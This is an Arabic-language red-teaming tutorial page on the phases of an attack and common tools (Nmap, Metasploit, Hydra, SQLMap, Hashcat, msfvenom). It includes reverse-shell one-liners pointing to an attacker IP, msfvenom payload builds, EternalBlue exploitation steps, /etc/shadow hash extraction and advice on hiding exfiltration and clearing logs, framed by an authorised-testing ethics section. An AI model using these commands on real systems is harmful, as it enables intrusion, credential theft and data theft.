⚔️ استراتيجيات Red Teaming الأساسية

Red Teaming (فريق الهجوم الأحمر) هو عملية محاكاة هجمات الخصوم المتقدمين لتقييم الدفاعات الأمنية للمؤسسة.

1. Reconnaissance — الاستطلاع

جمع أكبر قدر ممكن من المعلومات عن الهدف قبل الهجوم:

  • تجميع معلومات من مصادر مفتوحة (OSINT)
  • البحث عن الموظفين والبيانات على وسائل التواصل
  • تحديد البنية التحتية وأنواع الخوادم
  • اكتشاف المجالات الفرعية والخوادم المرتبطة

2. Scanning & Enumeration — الفحص والتعداد

البحث عن الخدمات المفتوحة والمتعرضة:

  • فحص المنافذ (Port Scanning) لتحديد الخدمات المفعلة
  • تحديد إصدارات البرامج والخدمات
  • البحث عن نقاط الضعف المعروفة
  • تجميع قائمة بالأهداف المحتملة للهجوم

3. Vulnerability Assessment — تقييم الثغرات

تحديد والعثور على نقاط الضعف:

  • اختبار التطبيقات الويب للثغرات
  • تحليل برامج الخادم للمشاكل الأمنية
  • اختبار الحسابات الضعيفة والغير محمية
  • فحص الإعدادات الخاطئة

4. Exploitation — الاستغلال

استغلال الثغرات المكتشفة:

  • استخدام أدوات الاستغلال المتقدمة
  • إنشاء payload مخصصة للهدف
  • محاولة الوصول الأولي للنظام
  • التعامل مع آليات الحماية والدفاعات

5. Post-Exploitation — ما بعد الاستغلال

الحفاظ على الوصول وتعميق الاختراق:

  • تثبيت أدوات للوصول الدائم
  • الانتقال الجانبي (Lateral Movement) عبر الشبكة
  • التوسع في الامتيازات (Privilege Escalation)
  • جمع البيانات الحساسة والمعلومات المهمة

6. Exfiltration — تسرب البيانات

نقل البيانات المسروقة بحذر:

  • التنكر عن الأنشطة المريبة
  • استخدام قنوات اتصال محفوظة
  • تقسيم البيانات لتجنب الكشف
  • تنظيف المسارات والسجلات

📚 تعلم كتابة الأوامر

1️⃣ أساسيات Terminal والـ Bash

قبل استخدام أي أداة، يجب أن تفهم أساسيات سطر الأوامر:

# التنقل بين المجلدات
cd /home/user

# عرض محتويات المجلد
ls -la

# إنشاء مجلد جديد
mkdir myfolder

# حذف ملف
rm filename.txt

# نسخ ملف
cp source.txt destination.txt

2️⃣ الأوامر الأساسية للشبكة

# معرفة عنوان IP الخاص بك
ifconfig

# اختبار اتصال الشبكة
ping google.com

# معرفة المسار إلى الخادم
traceroute google.com

# الاتصال بخادم بعيد
ssh user@192.168.1.100

3️⃣ أوامر Nmap الأساسية

# فحص بسيط للمنافذ
nmap 192.168.1.100

# فحص نطاق من الـ IPs
nmap 192.168.1.0/24

# اكتشاف الخدمات والإصدارات
nmap -sV 192.168.1.100

# فحص شامل
nmap -A -p- 192.168.1.100

4️⃣ أوامر المصادقة والصلاحيات

# التبديل إلى مستخدم الـ Root
sudo su

# تنفيذ أمر بصلاحية الـ Root
sudo nmap 192.168.1.100

# عرض صلاحيات الملف
ls -l filename.txt

# تغيير صلاحيات الملف
chmod 755 script.sh

5️⃣ نصائح مهمة للتعلم

  • ابدأ بالأساسيات: تعلم الأوامر البسيطة قبل الانتقال للمعقدة
  • استخدم Manual Pages: اكتب man nmap لمزيد من التفاصيل
  • التطبيق العملي: مارس على منصات آمنة مثل HackTheBox و TryHackMe
  • فهم الـ Flags: كل أداة لها خيارات (flags) مختلفة — اتعلمها كويس
  • التوثيق: اقرأ التوثيق الرسمي لكل أداة
  • التجربة والخطأ: الأخطاء هي أفضل طريقة للتعلم

🎓 الأساسيات والمفاهيم المهمة

ما هو Red Teaming؟

Red Teaming هو عملية اختبار الأمان حيث يلعب فريق "الهجوم الأحمر" دور المهاجمين الحقيقيين لتقييم الدفاعات والثغرات في أنظمة المنظمة. الهدف ليس التسبب في ضرر، بل اكتشاف الضعفيات قبل المهاجمين الفعليين.

الفرق بين الفرق الثلاث

🔴

Red Team — الهجوم

يحاكي المهاجمين الحقيقيين ويبحث عن الثغرات بكل الوسائل

🔵

Blue Team — الدفاع

يحافظ على الأمان ويصد الهجمات ويراقب الشبكة باستمرار

🟣

Purple Team — التكامل

يجمع بين الهجوم والدفاع لتحسين الأمان بشكل شامل

Kali Linux — ما هو؟

Kali Linux هو توزيعة Linux متخصصة في أمان المعلومات واختبار الاختراق. تحتوي على أكثر من 600 أداة للأمان السيبراني جاهزة للاستخدام مباشرة.

المفاهيم الأساسية

🔓 Vulnerability ضعف في النظام يمكن استغلاله من المهاجمين
⚡ Exploit الكود أو الأداة التي تستغل الثغرة
🎯 Payload الأداة التي تُنفَّذ بعد نجاح الاستغلال
🌐 Attack Surface كل نقاط الدخول المحتملة للمهاجم
🔑 Privilege Escalation رفع صلاحيات المهاجم بعد الدخول
📡 Lateral Movement الانتقال داخل الشبكة بعد الاختراق
🕵️ OSINT جمع معلومات من مصادر مفتوحة عامة
🛡️ Persistence الحفاظ على الوصول بعد إعادة التشغيل

مسار التعلم الموصى به

1
أساسيات Linux والشبكات تعلم أوامر الـ Terminal، بروتوكولات الشبكات، نموذج OSI
2
أساسيات الأمان السيبراني CIA Triad، أنواع الهجمات، مبادئ الدفاع
3
تثبيت Kali Linux والتطبيق إعداد بيئة الاختبار، VirtualBox أو VMware
4
أدوات المسح والاستطلاع Nmap، Wireshark، OSINT Tools
5
أدوات الاستغلال Metasploit، Burp Suite، SQLMap
6
الممارسة على منصات آمنة TryHackMe للمبتدئين، HackTheBox للمتقدمين
7
الحصول على شهادات احترافية CEH، eJPT للمبتدئين — OSCP للمحترفين

⚖️ القوانين والأخلاقيات

  • اختبر فقط الأنظمة التي لديك إذن خطي صريح باختبارها
  • الاختراق بدون إذن جريمة جنائية في معظم دول العالم
  • وثّق كل خطوة أثناء الاختبار وقدّم تقريراً شاملاً
  • لا تترك أي أثر ضار بعد انتهاء الاختبار

🔍 Nmap — فاحص المنافذ

ما هي Nmap؟
Nmap هي أسطورة في عالم اختبار الاختراق. تُستخدم لفحص المنافذ واكتشاف الخدمات المفتوحة على الأجهزة والشبكات.

الاستخدامات الرئيسية:

  • فحص المنافذ للتحقق من الخدمات المفعلة
  • اكتشاف الأجهزة على الشبكة
  • تحديد نوع وإصدار الخدمة
  • اكتشاف نظام التشغيل (OS Detection)
  • رسم خريطة للشبكة

الأوامر الأساسية:

# فحص بسيط
nmap 192.168.1.1

# فحص نطاق IP
nmap 192.168.1.0/24

# فحص جميع المنافذ
nmap -p- 192.168.1.1

# اكتشاف الخدمات والإصدارات
nmap -sV 192.168.1.1

# فحص نظام التشغيل
nmap -O 192.168.1.1

# فحص شامل مع التفاصيل
nmap -A -p- -sV 192.168.1.1

# حفظ النتائج
nmap -oN results.txt 192.168.1.1

أنواع الفحص:

  • TCP Scan (-sT): فحص الاتصال الكامل
  • SYN Scan (-sS): فحص سريع وسري
  • UDP Scan (-sU): فحص المنافذ UDP
  • Ping Scan (-sn): اكتشاف الأجهزة فقط

نصائح:

  • استخدم صلاحية الـ Root للحصول على نتائج أفضل
  • ابدأ بفحص سريع قبل الفحص الشامل
  • حفظ النتائج في ملفات للرجوع إليها لاحقاً
  • استخدم الـ Scripts (NSE) لمزيد من التفاصيل
✕

⚡ Metasploit Framework

ما هو Metasploit؟
إطار عمل قوي جداً لاختبار الاختراق والاستغلال. يحتوي على آلاف من الـ exploits والـ payloads الجاهزة.

المزايا الرئيسية:

  • آلاف الـ Exploits الجاهزة للاستخدام
  • محرك قوي لاختبار الثغرات
  • إنشاء Payloads مخصصة
  • إدارة الجلسات (Sessions)
  • دعم الـ Post-Exploitation

استخدام Metasploit:

# بدء Metasploit
msfconsole

# البحث عن exploit معين
search ms17-010

# اختيار exploit
use exploit/windows/smb/ms17_010_eternalblue

# عرض الخيارات
show options

# تعيين الهدف
set RHOSTS 192.168.1.100

# تشغيل الاستغلال
run

# عرض الجلسات النشطة
sessions

# الاتصال بجلسة
sessions -i 1

أنواع الـ Payloads:

  • Reverse Shell: يعطيك shell عكسي للنظام
  • Bind Shell: يفتح منفذ على الجهاز المستهدف
  • Meterpreter: أداة متقدمة للتحكم الكامل
  • Staged Payloads: تحميل البرنامج على مراحل

نصائح:

  • حدّث قاعدة البيانات بانتظام: msfupdate
  • تدرب على الثغرات المشهورة أولاً
  • استخدم الـ Post Scripts للاستكشاف بعد الاستغلال
  • وثّق النتائج والـ Sessions دايماً
✕

🔗 Burp Suite — اختبار تطبيقات الويب

ما هو Burp Suite؟
أداة متكاملة لاختبار أمان تطبيقات الويب. تتيح فحص جميع جوانب التطبيق والعثور على الثغرات.

المزايا الرئيسية:

  • اعتراض طلبات الويب (Proxy)
  • اختبار SQL Injection و XSS
  • فحص تطبيقات الويب تلقائياً
  • اختبار المصادقة (Authentication)
  • تحليل Response والـ Headers

خطوات الاستخدام:

# 1. فتح Burp Suite
burpsuite

# 2. إعداد المتصفح ليستخدم Burp Proxy
Browser Proxy: 127.0.0.1:8080

# 3. الدخول للموقع المراد اختباره
https://target-website.com

# 4. اعتراض الطلبات في Proxy
Forward/Drop الطلبات

# 5. تحليل الطلبات والـ Responses
البحث عن نقاط الضعف

أنواع الهجمات المختبرة:

  • SQL Injection: حقن قواعد البيانات
  • XSS: حقن JavaScript أو HTML
  • CSRF: Cross-Site Request Forgery
  • Broken Authentication: مشاكل المصادقة
  • Sensitive Data Exposure: تسرب البيانات الحساسة

نصائح:

  • استخدم Burp Suite مع متصفح منفصل
  • حفظ جميع الطلبات والـ Responses
  • تجنب إرسال طلبات خطيرة للمواقع الحقيقية
  • استخدم بيئة اختبار آمنة دائماً
✕

📊 Wireshark — محلل حزم الشبكة

ما هو Wireshark؟
أداة قوية لالتقاط وتحليل حزم الشبكة. ترى جميع البيانات المرسلة والمستقبلة على الشبكة.

الاستخدامات الرئيسية:

  • التقاط البيانات المرسلة على الشبكة
  • تحليل البروتوكولات المختلفة
  • اكتشاف المشاكل في الشبكة
  • مراقبة الاتصالات غير الآمنة
  • استخراج بيانات حساسة من الاتصالات المشفرة

الأوامر الأساسية:

# بدء التقاط الحزم
wireshark

# التقاط من واجهة معينة
wireshark -i eth0

# بدون واجهة رسومية (CLI)
tcpdump -i eth0 -w capture.pcap

# عرض الحزم المسجلة
tcpdump -r capture.pcap

# تصفية TCP فقط
tcpdump -i eth0 tcp

فلاتر مفيدة:

  • ip.addr == 192.168.1.1 — حزم IP محدد
  • tcp.port == 80 — منفذ محدد
  • http — حزم HTTP فقط
  • dns — استعلامات DNS
✕

📡 Aircrack-ng — اختبار الشبكات اللاسلكية

ما هو Aircrack-ng؟
مجموعة أدوات لاختبار أمان الشبكات اللاسلكية (WiFi). تتيح اختبار مستويات التشفير والثغرات الأمنية.

أوامر Aircrack-ng:

# تشغيل الواجهة في Monitor Mode
sudo airmon-ng start wlan0

# البحث عن الشبكات
sudo airodump-ng wlan0mon

# التقاط حركة شبكة معينة
sudo airodump-ng -c 6 -b xx:xx:xx:xx:xx:xx -w capture wlan0mon

# اختبار WPA/WPA2
sudo aircrack-ng -w wordlist.txt -b xx:xx:xx:xx:xx:xx capture.cap

# فك تشفير WEP
sudo aircrack-ng capture.cap

نصائح:

  • استخدم هذه الأدوات على شبكتك الخاصة فقط
  • قد تحتاج كرت WiFi يدعم Monitor Mode
  • اجمع كمية كافية من البيانات قبل الاختبار
  • استخدم قواميس كلمات مرور قوية
✕

🔑 John the Ripper — فك تشفير كلمات المرور

ما هو John the Ripper؟
أداة قوية لفك تشفير الهاشات وكسر كلمات المرور باستخدام القوة الغاشمة والقواميس.

أوامر John الأساسية:

# فك تشفير مع قاموس
john --wordlist=wordlist.txt hashes.txt

# تحديد نوع الهاش
john --format=md5 --wordlist=wordlist.txt hashes.txt

# القوة الغاشمة
john --format=md5 hashes.txt

# عرض كلمات المرور المكتشفة
john --show hashes.txt

# استخراج الهاشات من النظام
sudo unshadow /etc/passwd /etc/shadow > hash.txt

أنواع الهاشات المدعومة:

  • MD5 — هاش بسيط 128 بت
  • SHA1 — هاش 160 بت
  • SHA256/SHA512 — هاشات آمنة
  • bcrypt — هاش آمن للكلمات
  • LM Hash — نظام Windows القديم
✕

💾 SQLMap — اختبار SQL Injection

ما هو SQLMap؟
أداة آلية للكشف والاستغلال عن ثغرات SQL Injection في تطبيقات الويب.

أوامر SQLMap:

# اختبار بسيط على URL
sqlmap -u "http://target.com/page.php?id=1"

# اختبار مع POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=admin"

# استخراج قواعد البيانات
sqlmap -u "http://target.com/page.php?id=1" --dbs

# استخراج الجداول
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# استخراج البيانات
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump

أنواع SQL Injection:

  • Error-based: الاعتماد على رسائل الخطأ
  • Union-based: استخدام UNION في SQL
  • Blind SQL Injection: بدون رسائل خطأ
  • Time-based Blind: الاعتماد على التوقيت
✕

🌊 Hydra — هجمات القوة الغاشمة

ما هو Hydra؟
أداة سريعة وفعالة لتنفيذ هجمات القوة الغاشمة على خدمات مختلفة (SSH, FTP, HTTP, إلخ).

أوامر Hydra:

# هجوم على SSH
hydra -l username -P wordlist.txt ssh://192.168.1.100

# هجوم على FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.100

# هجوم على HTTP Form
hydra -l admin -P wordlist.txt http-post-form://target.com/login:user=^USER^&pass=^PASS^:F=invalid

# محاولات متزامنة
hydra -l user -P wordlist.txt -t 4 ssh://192.168.1.100

# أسماء مستخدمين متعددة
hydra -L usernames.txt -P wordlist.txt ssh://192.168.1.100

الخدمات المدعومة:

  • SSH, FTP, HTTP/HTTPS
  • RDP, VNC, Telnet
  • IMAP, SMTP, POP3
  • MySQL, PostgreSQL, MSSQL
✕

⚙️ Hashcat — فك تشفير الهاشات بـ GPU

ما هو Hashcat؟
أداة متقدمة لفك تشفير الهاشات باستخدام قوة كرت الشاشة (GPU)، أسرع بكثير من John the Ripper.

أوامر Hashcat:

# فك تشفير MD5 مع قاموس
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# فك تشفير SHA1
hashcat -m 100 -a 0 hashes.txt wordlist.txt

# القوة الغاشمة
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a

# مع Rules
hashcat -m 0 -a 0 -r rules/best64.rule hashes.txt wordlist.txt

# عرض الأجهزة المتاحة
hashcat -I

# حفظ النتائج
hashcat -m 0 -a 0 hashes.txt wordlist.txt --outfile=results.txt

أنماط الهجوم:

  • -a 0: Dictionary Attack (القاموس)
  • -a 1: Combination (دمج القواميس)
  • -a 3: Brute Force (القوة الغاشمة)
  • -a 6: Hybrid (هجوم هجين)
✕

🎯 Payloads — بناء الحمولات المخصصة

ما هي Payloads؟
الأوامر أو البرامج التي تُنفَّذ على النظام المستهدف بعد نجاح الاستغلال.

أنواع الـ Payloads:

  • Reverse Shell: اتصال عكسي للتحكم الكامل
  • Bind Shell: فتح منفذ على الجهاز المستهدف
  • Meterpreter: أداة متقدمة للتحكم التفاعلي
  • One-liners: أوامر بسيطة في سطر واحد

بناء Payloads مع msfvenom:

# Windows Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Linux Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# عرض الخيارات
msfvenom -p windows/meterpreter/reverse_tcp --list-options

أشهر Reverse Shells:

  • netcat: nc -e /bin/sh attacker-ip 4444
  • bash: bash -i >& /dev/tcp/ip/port 0>&1
  • python: python -c 'import socket,...'
  • perl: perl -e 'use Socket;...'

🚀 Gobuster — اكتشاف المجلدات والملفات

ما هو Gobuster؟
أداة سريعة لاكتشاف المجلدات والملفات المخفية في تطبيقات الويب.

أوامر Gobuster:

# اكتشاف المجلدات
gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt

# مع extensions معينة
gobuster dir -u http://target.com -w wordlist.txt -x .php,.html,.js

# Subdomain Enumeration
gobuster dns -d target.com -w subdomains.txt

# مع Headers مخصصة
gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token"

# تعديل السرعة
gobuster dir -u http://target.com -w wordlist.txt -t 50

مصادر Wordlists:

  • /usr/share/wordlists/ — قواميس Kali الافتراضية
  • SecLists (GitHub) — قواميس شاملة ومتنوعة
  • dirb wordlists — قواميس مشهورة لاكتشاف المسارات

🔐 SSH Tools — أدوات الاتصال الآمن

ما هو SSH؟
SSH (Secure Shell) بروتوكول آمن للاتصال بأجهزة بعيدة. أداة قوية للـ Remote Administration ونقل الملفات.

أوامر SSH الأساسية:

# الاتصال البسيط
ssh username@192.168.1.100

# الاتصال على منفذ مختلف
ssh -p 2222 username@192.168.1.100

# نقل ملف من الجهاز البعيد
scp username@192.168.1.100:/path/file.txt ./local

# نقل ملف إلى الجهاز البعيد
scp ./file.txt username@192.168.1.100:/path/

# إنشاء SSH Key
ssh-keygen -t rsa -f ~/.ssh/id_rsa

# Forward Port
ssh -L 8080:localhost:80 username@192.168.1.100

# Dynamic Proxy (SOCKS5)
ssh -D 9050 username@192.168.1.100

أفضل الممارسات الأمنية:

  • استخدم SSH Keys بدلاً من كلمات المرور
  • عطّل المصادقة بكلمة المرور إن أمكن
  • غيّر رقم المنفذ من 22 لرقم آخر
  • استخدم Firewall لتقييد الوصول
  • حدّث SSH بانتظام
